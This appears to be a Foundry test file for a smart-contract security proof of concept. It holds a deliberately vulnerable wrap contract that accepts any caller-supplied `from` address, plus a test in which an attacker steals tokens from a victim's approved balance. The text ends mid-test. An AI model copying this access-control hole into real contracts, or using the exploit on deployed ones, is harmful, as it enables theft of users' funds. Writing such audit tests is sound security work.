// Minimal vulnerable replica
contract WJLP {
    // Vulnerable: caller supplies `from` and `to` freely
    function wrap(address token, address from, address to, uint256 amount) external {
        // move funds from `from` into the contract
        IERC20(token).transferFrom(from, address(this), amount);
        // then forward resulting tokens to `to` — no access control on `from`/`to`
        IERC20(token).transfer(to, amount);
    }
}

contract WJLPTest is Test {
    WJLP target;
    MockToken token;
    address alice;
    address attacker;

    function setUp() public {
        token = new MockToken();
        target = new WJLP();
        alice = makeAddr("alice");
        attacker = makeAddr("attacker");

        // Give Alice some tokens and approve the WJLP contract
        token.mint(alice, 1_000 ether);
        vm.prank(alice);
        token.approve(address(target), type(uint256).max);
    }

    function test_attacker_exploits_wrap() public {
        // Attacker calls wrap specifying Alice as `from` and himself as `to`
        uint256 steal = 500 ether;
        vm.prank(attacker);
        target.wrap(address(token), alice, attacker, steal);

        // Attacker received tokens taken from Alice's approved balance
        assertEq(token.balanceOf(attacker), steal);
